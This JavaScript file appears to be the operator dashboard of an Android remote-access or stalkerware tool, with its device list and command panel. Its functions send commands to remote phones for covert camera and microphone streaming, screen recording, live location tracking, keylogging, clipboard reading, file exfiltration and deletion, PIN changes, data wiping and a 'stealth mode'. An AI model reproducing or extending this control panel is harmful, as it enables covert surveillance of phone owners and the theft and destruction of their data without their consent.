// Dashboard JavaScript for Android Remote Control
class RemoteControlDashboard {
    constructor() {
        this.socket = io();
        this.selectedDevice = null;
        this.devices = [];
        this.setupSocketListeners();
        this.setupUI();
        this.loadDevices();
    }

    setupSocketListeners() {
        this.socket.on('connect', () => {
            console.log('Connected to server');
            this.socket.emit('subscribeToDevices');
        });

        this.socket.on('deviceStatusUpdate', (data) => {
            this.updateDeviceStatus(data);
        });

        this.socket.on('locationUpdate', (data) => {
            this.updateLocation(data);
        });

        this.socket.on('commandSent', (data) => {
            if (data.success) {
                this.showNotification('Command sent successfully', 'success');
            } else {
                this.showNotification('Failed to send command: ' + data.error, 'error');
            }
        });
    }

    setupUI() {
        // Setup brightness slider
        const brightnessSlider = document.getElementById('brightnessSlider');
        const brightnessValue = document.getElementById('brightnessValue');
        if (brightnessSlider) {
            brightnessSlider.addEventListener('input', (e) => {
                brightnessValue.textContent = e.target.value;
            });
        }

        // Setup volume slider
        const volumeSlider = document.getElementById('volumeSlider');
        const volumeValue = document.getElementById('volumeValue');
        if (volumeSlider) {
            volumeSlider.addEventListener('input', (e) => {
                volumeValue.textContent = e.target.value;
            });
        }
    }

    async loadDevices() {
        try {
            const response = await fetch('/api/devices');
            const devices = await response.json();
            this.devices = devices;
            this.renderDevices();
        } catch (error) {
            console.error('Error loading devices:', error);
            this.showNotification('Failed to load devices', 'error');
        }
    }

    renderDevices() {
        const deviceList = document.getElementById('deviceList');
        if (!deviceList) return;

        deviceList.innerHTML = '';
        
        if (this.devices.length === 0) {
            deviceList.innerHTML = '<div class="col-12 text-center"><p>No devices connected</p></div>';
            return;
        }

        this.devices.forEach(device => {
            const deviceCard = this.createDeviceCard(device);
            deviceList.appendChild(deviceCard);
        });
    }

    createDeviceCard(device) {
        const col = document.createElement('div');
        col.className = 'col-md-6 col-lg-4 mb-3';
        
        const status = device.deviceStatus ? 'online' : 'offline';
        const statusClass = device.deviceStatus ? 'status-online' : 'status-offline';
        
        col.innerHTML = `
            <div class="card device-card" onclick="dashboard.selectDevice('${device.userId}')">
                <div class="card-body">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <h6 class="card-title mb-0">
                            <span class="status-indicator ${statusClass}"></span>
                            Device ${device.userId}
                        </h6>
                        <span class="badge bg-${status === 'online' ? 'success' : 'danger'}">${status}</span>
                    </div>
                    ${device.lastLocation ? `
                        <p class="card-text small">
                            <i class="fas fa-map-marker-alt"></i>
                            ${device.lastLocation.latitude.toFixed(6)}, ${device.lastLocation.longitude.toFixed(6)}
                        </p>
                        <p class="card-text small text-muted">
                            <i class="fas fa-clock"></i>
                            ${device.lastLocation.formattedDateTime || 'Unknown'}
                        </p>
                    ` : '<p class="card-text small text-muted">No location data</p>'}
                </div>
            </div>
        `;
        
        return col;
    }

    selectDevice(userId) {
        this.selectedDevice = userId;
        this.showNotification(`Selected device: ${userId}`, 'info');
        
        // Update UI to show selected device
        document.querySelectorAll('.device-card').forEach(card => {
            card.classList.remove('border-primary');
        });
        
        event.currentTarget.classList.add('border-primary');
    }

    sendCommand(action, args = {}) {
        if (!this.selectedDevice) {
            this.showNotification('Please select a device first', 'warning');
            return;
        }

        const command = {
            action: action,
            args: args
        };

        this.socket.emit('sendCommand', {
            userId: this.selectedDevice,
            command: JSON.stringify(command)
        });

        this.logCommand(action, args);
    }

    logCommand(action, args) {
        const logsContainer = document.getElementById('commandLogs');
        if (logsContainer) {
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            logEntry.innerHTML = `
                <strong>${new Date().toLocaleTimeString()}</strong> - ${action}
                ${Object.keys(args).length > 0 ? `<br><small>Args: ${JSON.stringify(args)}</small>` : ''}
            `;
            logsContainer.appendChild(logEntry);
            logsContainer.scrollTop = logsContainer.scrollHeight;
        }
    }

    showNotification(message, type = 'info') {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `alert alert-${type === 'error' ? 'danger' : type} alert-dismissible fade show position-fixed`;
        notification.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
        notification.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;
        
        document.body.appendChild(notification);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    // Media & Surveillance Commands
    takePicture() {
        const cameraType = document.getElementById('cameraType')?.value || 'back';
        this.sendCommand('take_picture', { camera: cameraType });
    }

    startCameraStream() {
        const cameraType = document.getElementById('cameraType')?.value || 'back';
        this.sendCommand('stream_camera', { camera: cameraType, start: true });
    }

    stopCameraStream() {
        this.sendCommand('stream_camera', { start: false });
    }

    recordAudio() {
        const duration = document.getElementById('audioDuration')?.value || 30;
        this.sendCommand('record_audio', { duration: parseInt(duration) });
    }

    startMicStream() {
        this.sendCommand('stream_mic', { start: true });
    }

    stopMicStream() {
        this.sendCommand('stream_mic', { start: false });
    }

    takeScreenshot() {
        this.sendCommand('screenshot');
    }

    startScreenRecord() {
        this.sendCommand('screen_record', { start: true });
    }

    stopScreenRecord() {
        this.sendCommand('screen_record', { start: false });
    }

    // Location & Device Info Commands
    getLocation() {
        this.sendCommand('get_location');
    }

    startLiveTracking() {
        const interval = document.getElementById('trackingInterval')?.value || 5;
        this.sendCommand('live_tracking', { enable: true, interval: parseInt(interval) });
    }

    stopLiveTracking() {
        this.sendCommand('live_tracking', { enable: false });
    }

    getDeviceInfo() {
        this.sendCommand('get_device_info');
    }

    // Control & Automation Commands
    launchApp() {
        const packageName = document.getElementById('packageName')?.value;
        if (!packageName) {
            this.showNotification('Please enter a package name', 'warning');
            return;
        }
        this.sendCommand('launch_app', { package_name: packageName });
    }

    closeApp() {
        const packageName = document.getElementById('packageName')?.value;
        if (!packageName) {
            this.showNotification('Please enter a package name', 'warning');
            return;
        }
        this.sendCommand('close_app', { package_name: packageName });
    }

    openUrl() {
        const url = document.getElementById('urlToOpen')?.value;
        if (!url) {
            this.showNotification('Please enter a URL', 'warning');
            return;
        }
        this.sendCommand('open_url', { url: url });
    }

    lockDevice() {
        this.sendCommand('lock_device');
    }

    toggleWifi(enable) {
        this.sendCommand('toggle_wifi', { enable: enable });
    }

    toggleBluetooth(enable) {
        this.sendCommand('toggle_bluetooth', { enable: enable });
    }

    vibrate() {
        const duration = document.getElementById('vibrationDuration')?.value || 1000;
        this.sendCommand('vibrate', { duration: parseInt(duration) });
    }

    showToast() {
        const message = document.getElementById('toastMessage')?.value;
        if (!message) {
            this.showNotification('Please enter a message', 'warning');
            return;
        }
        this.sendCommand('show_toast', { message: message });
    }

    setBrightness() {
        const brightness = document.getElementById('brightnessSlider')?.value || 128;
        this.sendCommand('set_brightness', { brightness: parseInt(brightness) });
    }

    setVolume() {
        const volume = document.getElementById('volumeSlider')?.value || 50;
        this.sendCommand('set_volume', { volume: parseInt(volume) });
    }

    // File & Storage Commands
    listFiles() {
        const path = document.getElementById('filePath')?.value || '/';
        this.sendCommand('list_files', { path: path });
    }

    readFile() {
        const path = document.getElementById('readFilePath')?.value;
        if (!path) {
            this.showNotification('Please enter a file path', 'warning');
            return;
        }
        this.sendCommand('read_file', { path: path });
    }

    deleteFile() {
        const path = document.getElementById('deleteFilePath')?.value;
        if (!path) {
            this.showNotification('Please enter a file path', 'warning');
            return;
        }
        if (confirm('Are you sure you want to delete this file?')) {
            this.sendCommand('delete_file', { path: path });
        }
    }

    downloadFile() {
        const url = document.getElementById('downloadUrl')?.value;
        const localPath = document.getElementById('localPath')?.value;
        if (!url || !localPath) {
            this.showNotification('Please enter both URL and local path', 'warning');
            return;
        }
        this.sendCommand('download_file', { url: url, local_path: localPath });
    }

    uploadFile() {
        const path = document.getElementById('uploadFilePath')?.value;
        if (!path) {
            this.showNotification('Please enter a file path', 'warning');
            return;
        }
        this.sendCommand('upload_file', { path: path });
    }

    // System & Security Commands
    toggleKeylogger(enable) {
        this.sendCommand('keylogger', { enable: enable });
    }

    readClipboard() {
        this.sendCommand('clipboard_read');
    }

    writeClipboard() {
        const text = document.getElementById('clipboardText')?.value;
        if (!text) {
            this.showNotification('Please enter text for clipboard', 'warning');
            return;
        }
        this.sendCommand('clipboard_write', { text: text });
    }

    changePin() {
        const newPin = document.getElementById('newPin')?.value;
        if (!newPin) {
            this.showNotification('Please enter a new PIN', 'warning');
            return;
        }
        if (confirm('Are you sure you want to change the device PIN?')) {
            this.sendCommand('change_pin', { new_pin: newPin });
        }
    }

    lockApp() {
        const packageName = document.getElementById('appToLock')?.value;
        if (!packageName) {
            this.showNotification('Please enter a package name', 'warning');
            return;
        }
        this.sendCommand('lock_app', { package_name: packageName });
    }

    shutdown() {
        if (confirm('Are you sure you want to shutdown the device?')) {
            this.sendCommand('shutdown');
        }
    }

    reboot() {
        if (confirm('Are you sure you want to reboot the device?')) {
            this.sendCommand('reboot');
        }
    }

    wipeData() {
        if (confirm('WARNING: This will wipe all data from the device. Are you absolutely sure?')) {
            if (confirm('This action cannot be undone. Proceed?')) {
                this.sendCommand('wipe_data');
            }
        }
    }

    enableStealthMode() {
        this.sendCommand('stealth_mode', { enable: true });
    }

    disableStealthMode() {
        this.sendCommand('stealth_mode', { enable: false });
    }

    sendCustomCommand() {
        const command = document.getElementById('customCommand')?.value;
        if (!command) {
            this.showNotification('Please enter a command', 'warning');
            return;
        }
        this.sendCommand(command);
    }

    // Utility functions
    refreshDevices() {
        this.loadDevices();
        this.showNotification('Refreshing devices...', 'info');
    }

    updateDeviceStatus(data) {
        const device = this.devices.find(d => d.userId === data.userId);
        if (device) {
            device.deviceStatus = data.status;
            this.renderDevices();
        }
    }

    updateLocation(data) {
        const device = this.devices.find(d => d.userId === data.userId);
        if (device) {
            device.lastLocation = data.location;
            this.renderDevices();
        }
    }
}

// Initialize dashboard when page loads
let dashboard;
document.addEventListener('DOMContentLoaded', () => {
    dashboard = new RemoteControlDashboard();
});

// Global functions for button onclick handlers
function takePicture() { dashboard.takePicture(); }
function startCameraStream() { dashboard.startCameraStream(); }
function stopCameraStream() { dashboard.stopCameraStream(); }
function recordAudio() { dashboard.recordAudio(); }
function startMicStream() { dashboard.startMicStream(); }
function stopMicStream() { dashboard.stopMicStream(); }
function takeScreenshot() { dashboard.takeScreenshot(); }
function startScreenRecord() { dashboard.startScreenRecord(); }
function stopScreenRecord() { dashboard.stopScreenRecord(); }
function getLocation() { dashboard.getLocation(); }
function startLiveTracking() { dashboard.startLiveTracking(); }
function stopLiveTracking() { dashboard.stopLiveTracking(); }
function getDeviceInfo() { dashboard.getDeviceInfo(); }
function launchApp() { dashboard.launchApp(); }
function closeApp() { dashboard.closeApp(); }
function openUrl() { dashboard.openUrl(); }
function lockDevice() { dashboard.lockDevice(); }
function toggleWifi(enable) { dashboard.toggleWifi(enable); }
function toggleBluetooth(enable) { dashboard.toggleBluetooth(enable); }
function vibrate() { dashboard.vibrate(); }
function showToast() { dashboard.showToast(); }
function setBrightness() { dashboard.setBrightness(); }
function setVolume() { dashboard.setVolume(); }
function listFiles() { dashboard.listFiles(); }
function readFile() { dashboard.readFile(); }
function deleteFile() { dashboard.deleteFile(); }
function downloadFile() { dashboard.downloadFile(); }
function uploadFile() { dashboard.uploadFile(); }
function toggleKeylogger(enable) { dashboard.toggleKeylogger(enable); }
function readClipboard() { dashboard.readClipboard(); }
function writeClipboard() { dashboard.writeClipboard(); }
function changePin() { dashboard.changePin(); }
function lockApp() { dashboard.lockApp(); }
function shutdown() { dashboard.shutdown(); }
function reboot() { dashboard.reboot(); }
function wipeData() { dashboard.wipeData(); }
function enableStealthMode() { dashboard.enableStealthMode(); }
function disableStealthMode() { dashboard.disableStealthMode(); }
function sendCustomCommand() { dashboard.sendCustomCommand(); }
function refreshDevices() { dashboard.refreshDevices(); }